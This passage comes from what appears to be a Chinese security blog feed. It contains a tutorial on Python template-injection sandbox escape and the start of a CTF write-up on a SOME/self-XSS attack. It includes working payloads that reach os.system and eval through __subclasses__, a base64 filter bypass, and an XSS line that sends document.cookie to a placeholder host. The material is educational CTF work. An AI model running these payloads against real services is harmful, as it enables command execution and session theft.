&lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;class &apos;__main__.Foo&apos;&gt;]</span><br></pre></td></tr></table></figure><p><code>().__class__.__bases__[0].__subclasses__()[40]</code>没错就是要返回file对象</p><blockquote><p>需要提醒的是<code>__subclasses__()</code>方法返回的是一个列表</p></blockquote><p>至于为什么要返回file对象，其实这里主要是看我们自己的需要的。</p><p>所以这里的思路就是<br>1.通过<code>__class__</code>返回对应类型<br>2.通过<code>__bases__[0]</code>返回基类object<br>3.通过<code>__subclasses__()</code>方法找到我们需要的类</p><p>刚刚在找资料的时候发现有一篇cl0und@Syclover师傅的也总结的很好,同样也可以看看</p><blockquote><p><a href="https://xz.aliyun.com/t/2308#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-7</a></p></blockquote><h4 id="1-5-Python-的内建函数"><a href="#1-5-Python-的内建函数" class="headerlink" title="1.5 Python 的内建函数"></a>1.5 Python 的内建函数</h4><p>在 Python 中，不引入直接使用的内置函数被成为 builtin 函数，<br>我们可以通过可以通过<code>dir __builtin__</code>来获取内置函数列表</p><p>可以在python文档中查询python的内置方法</p><blockquote><p><a href="https://docs.python.org/2/library/stdtypes.html" target="_blank" rel="noopener">https://docs.python.org/2/library/stdtypes.html</a></p></blockquote><p>所以我们</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(().__class__.__bases__[0].__subclasses__()[40])</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;__class__&apos;, &apos;__delattr__&apos;, &apos;__doc__&apos;, &apos;__enter__&apos;, &apos;__exit__&apos;, &apos;__format__&apos;, &apos;__getattribute__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__iter__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;close&apos;, &apos;closed&apos;, &apos;encoding&apos;, &apos;errors&apos;, &apos;fileno&apos;, &apos;flush&apos;, &apos;isatty&apos;, &apos;mode&apos;, &apos;name&apos;, &apos;newlines&apos;, &apos;next&apos;, &apos;read&apos;, &apos;readinto&apos;, &apos;readline&apos;, &apos;readlines&apos;, &apos;seek&apos;, &apos;softspace&apos;, &apos;tell&apos;, &apos;truncate&apos;, &apos;write&apos;, &apos;writelines&apos;, &apos;xreadlines&apos;]</span><br></pre></td></tr></table></figure><p>那么那么其实</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read()</span><br></pre></td></tr></table></figure><p>这个payload的意思是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(r&apos;C:\1.php&apos;).read()</span><br></pre></td></tr></table></figure><h4 id="常见payload2"><a href="#常见payload2" class="headerlink" title="常见payload2"></a>常见payload2</h4><p>我们再说说一些常见payload，虽然所从表面看我们大概能看出这些payload是用来干什么的但是一些细节可能还不是非常清楚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python2：</span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&apos;os.system(&quot;ls&quot;)&apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3：</span><br><span class="line">&apos; &apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;]</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;]</span><br></pre></td></tr></table></figure><h4 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h4><p>我们再讲下下面这个payload<br><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure><p>对于前面这一段应该都比较清楚了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[71]</span><br><span class="line">&lt;class &apos;site._Printer&apos;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[76]</span><br><span class="line">&lt;class &apos;site.Quitter&apos;&gt;</span><br></pre></td></tr></table></figure><p>又有一个疑惑出来了这个<code>&lt;class &#39;site._Printer&#39;&gt;</code> <code>&lt;class &#39;site.Quitter&#39;&gt;</code> 是什么东西？？？为什么要引用这个类呢？</p><p>对于site.xxx我个人是理解为引入此模块中的一些附加的内置函数。</p><p>其实这两段payload的目的是要引入import os模块</p><h4 id="2-2-init-globals"><a href="#2-2-init-globals" class="headerlink" title="2.2 __init__.__globals__"></a>2.2 <code>__init__.__globals__</code></h4><p>那么<code>__init__.__globals__</code>这又是什么意思呢？</p><p><code>__init__</code><br><code>__init__</code>为控制的是类生成的对象，举个例子更好理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...     def __init__(self,name):</span><br><span class="line">...         self.name = name</span><br><span class="line">...         print &quot;init&quot;</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; if __name__ == &apos;__main__&apos;:</span><br><span class="line">...     user = User(&quot;test&quot;)</span><br><span class="line">... </span><br><span class="line">init</span><br></pre></td></tr></table></figure><p><code>__globals__</code><br>函数名.<code>__globals__</code>对包含函数全局变量的字典进行引用，换句话说就是返回一个当前空间下能使用的模块，方法和变量的字典。</p><p>所以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;]</span><br></pre></td></tr></table></figure><p>这段其实就是为了导入os模块，至于为什么要导入os模块，os 模块提供了非常丰富的方法用来处理文件和目录。所以os模块的重要性不言而喻了吧？</p><p>至于如何搜索哪个site.xx中有os模块这里提供一个脚本</p><p>我自己懒得重写了，来自bendawang师傅</p><blockquote><p><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">cnt=0</span><br><span class="line">for item in [].__class__.__base__.__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">        if &apos;os&apos; in item.__init__.__globals__:</span><br><span class="line">            print cnt,item</span><br><span class="line">        cnt+=1</span><br><span class="line">    except:</span><br><span class="line">        print &quot;error&quot;,cnt,item</span><br><span class="line">        cnt+=1</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure><p>最终会发现只有site.Quitter，与site._Printer中有os模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">71 &lt;class &apos;site._Printer&apos;&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">76 &lt;class &apos;site.Quitter&apos;</span><br></pre></td></tr></table></figure><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>那么下面这个payload又是什么意思呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br></pre></td></tr></table></figure><p><code>&quot;&quot;.__class__.__mro__[-1]</code><br>毫无疑问也同样是要引入object对象</p><p><code>__mro__</code></p><p>递归地显示父类一直到 object</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__</span><br><span class="line">(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[-1]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure><p>那么<code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;]</code><br><code>[&#39;__builtins__&#39;]</code> 是什么意思呢？？？<br>首先我们需要知道在 Python 中导入模块的方法通常有三种（xxx 为模块名称）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. import xxx</span><br><span class="line">2. from xxx import *</span><br><span class="line">3. __import__(&apos;xxx&apos;)</span><br></pre></td></tr></table></figure><p>当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。<br>随着 builtin 这个模块自动引入到环境中。</p><p>其实这里的<code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;]</code><br>与<code>__builtins__</code><br>其实还是有所区别的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__</span><br><span class="line">&lt;module &apos;__builtin__&apos; (built-in)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;]</span><br><span class="line">&#123;&apos;bytearray&apos;: &lt;type &apos;bytearray&apos;&gt;, &apos;IndexError&apos;: &lt;type &apos;exceptions.IndexError&apos;&gt; ...........</span><br></pre></td></tr></table></figure><p>对于<code>__builtins__</code>我们如何引入的模块呢？我们可以通过 dict 引入我们想要引入的模块。dict 的作用是列出一个模组  类  对象 下面 所有的属性和函数。<br>实例： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&apos;__import__&apos;](&apos;os&apos;)</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br></pre></td></tr></table></figure><p>当然我们可以通过换种方式来绕过限制，比如使用base64加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&apos;__import__&apos;)</span><br><span class="line">&apos;X19pbXBvcnRfXw==&apos;</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&apos;os&apos;)</span><br><span class="line">&apos;b3M=&apos;</span><br></pre></td></tr></table></figure><p>然后通过 dict 引用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;))</span><br></pre></td></tr></table></figure><p>毫无疑问<br><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></p><p>这段其实作用和之前的是一样的</p><p>这里我们同样讲解下eval<br>eval()函数十分强大，官方demo解释为：将字符串str当成有效的表达式来求值并返回计算结果。<br>但是如果滥用eval（）的话就会导致如果用户恶意输入，例如：</p><p><code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code></p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>下一个payload</p><p><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29]</span><br><span class="line">&lt;type &apos;builtin_function_or_method&apos;&gt;</span><br></pre></td></tr></table></figure><p>对于<code>__call__</code><br>Python中的函数的引用可以作为输入传递到其他的函数/方法中，并在其中被执行。 </p><p>这段的意思我认为是将(eval,’os.system(“ls”)’)作为内置函数执行</p><p>大概把想讲的都讲了吧</p><h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><h4 id="SSTI-in-Flask"><a href="#SSTI-in-Flask" class="headerlink" title="SSTI in Flask"></a>SSTI in Flask</h4><p>TokyoWesterns CTF 4th 2018 shrine<br>详解 </p><blockquote><p><a href="https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4" target="_blank" rel="noopener">https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4</a></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html" target="_blank" rel="noopener">https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html</a><br><a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/</a><br><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a><br><a href="https://www.anquanke.com/post/id/85672" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85672</a><br><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a><br><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a><br><a href="https://juejin.im/post/5a0a458951882503dc5336c1" target="_blank" rel="noopener">https://juejin.im/post/5a0a458951882503dc5336c1</a><br><a href="https://www.evget.com/article/2015/8/28/22603.html" target="_blank" rel="noopener">https://www.evget.com/article/2015/8/28/22603.html</a><br><a href="https://hwhxy.github.io/ctf/2018/07/26/%E4%BB%8ECTF%E4%B8%AD%E5%AD%A6%E4%B9%A0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://hwhxy.github.io/ctf/2018/07/26/%E4%BB%8ECTF%E4%B8%AD%E5%AD%A6%E4%B9%A0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</a><br><a href="https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/</a><br><a href="http://cauc.me/2017/10/21/%E4%BB%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%B0%88%E8%B5%B7/" target="_blank" rel="noopener">http://cauc.me/2017/10/21/%E4%BB%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%B0%88%E8%B5%B7/</a><br><a href="https://www.k0rz3n.com/2018/10/04/Python%20%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%EF%BC%88%E9%87%8D%E7%82%B9%E5%9C%A8%E4%BA%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%EF%BC%89/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/10/04/Python%20%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%EF%BC%88%E9%87%8D%E7%82%B9%E5%9C%A8%E4%BA%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%EF%BC%89/</a><br><a href="https://xz.aliyun.com/t/2308#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-7</a><br><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      这是我对Python服务端模板注入与沙盒逃逸的学习小结与实践
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="模板注入" scheme="https://museljh.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2017 Deserted place(SOME攻击)</title>
    <link href="https://museljh.github.io/2019/03/20/HCTF%202017%20Deserted%20place(SOME%E6%94%BB%E5%87%BB)/"/>
    <id>https://museljh.github.io/2019/03/20/HCTF 2017 Deserted place(SOME攻击)/</id>
    <published>2019-03-19T16:37:50.000Z</published>
    <updated>2019-03-19T16:46:57.807Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HCTF-2017-Deserted-place-SOME攻击"><a href="#HCTF-2017-Deserted-place-SOME攻击" class="headerlink" title="HCTF 2017 Deserted place(SOME攻击)"></a>HCTF 2017 Deserted place(SOME攻击)</h2><p>注册并登入。<br>发现change something中的message是可以进行self-xss的。<br>一般这种题目是需要获取admin的cookie，那么我们该如何做到呢？<br>首先列举下我们已知的条件。<br>1.首先我们知道something中的message可以进行self-xss比如<code>&lt;img src=&quot;1&quot; onerror=&quot;location=&#39;http://xxxx/&#39;%2bdocument.cookie&quot;&gt;</code>，2.其次我们能够发现以发现在change something 会执行一个edit（）函数，如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> newWin = <span class="built_in">window</span>.open(<span class="string">"./edit.php?callback=EditProfile"</span>,<span class="string">''</span>,<span class="string">'width=600,height=600'</span>);</span><br><span class="line"><span class="keyword">var</span> loop = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">if</span>(newWin.closed) &#123;  </span><br><span class="line">    clearInterval(loop);  </span><br><span class="line">    update();</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>并且关闭窗口时候会执行update函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>email = <span class="built_in">document</span>.getElementById(<span class="string">"email"</span>).innerHTML.substr(<span class="number">7</span>);</span><br><span class="line"><span class="keyword">var</span> message = <span class="built_in">document</span>.getElementById(<span class="string">"mess"</span>).innerHTML.substr(<span class="number">9</span>);</span><br><span class="line"><span class="keyword">var</span> csrftoken = <span class="built_in">document</span>.getElementById(<span class="string">"csrft"</span>).innerHTML.substr(<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">x.open(<span class="string">'POST'</span>, <span class="string">'./api/update.php'</span>, <span class="literal">true</span>); </span><br><span class="line">x.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">x.send(<span class="string">'message='</span>+message+<span class="string">'&amp;email='</span>+email+<span class="string">'&amp;csrftoken='</span>+csrftoken);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看看子窗口的源码，一旦关闭这个页面便会将内容传给父窗口</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UpdateProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> username = <span class="built_in">document</span>.getElementById(<span class="string">'user'</span>).value;</span><br><span class="line"><span class="keyword">var</span> email = <span class="built_in">document</span>.getElementById(<span class="string">'email'</span>).value;</span><br><span class="line"><span class="keyword">var</span> message = <span class="built_in">document</span>.getElementById(<span class="string">'mess'</span>).value;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.opener.document.getElementById(<span class="string">"email"</span>).innerHTML=<span class="string">"Email: "</span>+email;</span><br><span class="line"><span class="built_in">window</span>.opener.document.getElementById(<span class="string">"mess"</span>).innerHTML=<span class="string">"Message: "</span>+message;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Update user profile success..."</span>);</span><br><span class="line"><span class="built_in">window</span>.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EditProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">document</span>.onkeydown=<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (event.keyCode == <span class="number">13</span>)&#123;</span><br><span class="line">UpdateProfile();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">setTimeout(<span class="string">'UpdateProfile()'</span>, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个流程大致意思是，修改子窗口的时候，关闭子窗口会将子窗口内容传给父窗口，并且子窗口有个jsonp的回调函数负责传递方法callback。</p><p>主页面中还有一个clickme 执行了random方法具体函数如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> newWin = <span class="built_in">window</span>.open(<span class="string">"./edit.php?callback=RandomProfile"</span>,<span class="string">''</span>,<span class="string">'width=600,height=600'</span>);</span><br><span class="line"><span class="keyword">var</span> loop = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">if</span>(newWin.closed) &#123;  </span><br><span class="line">    clearInterval(loop);  </span><br><span class="line">    update();</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>而random方法又会执行RandomProfile，RandomProfile又会执行UpdateProfile</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">setTimeout(<span class="string">'UpdateProfile()'</span>, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>这里我们需要使用some攻击<br>首先我们在自己vps中创建两个页面1.html，2.html</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">start_some</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">window</span>.open(<span class="string">"2.html"</span>);</span><br><span 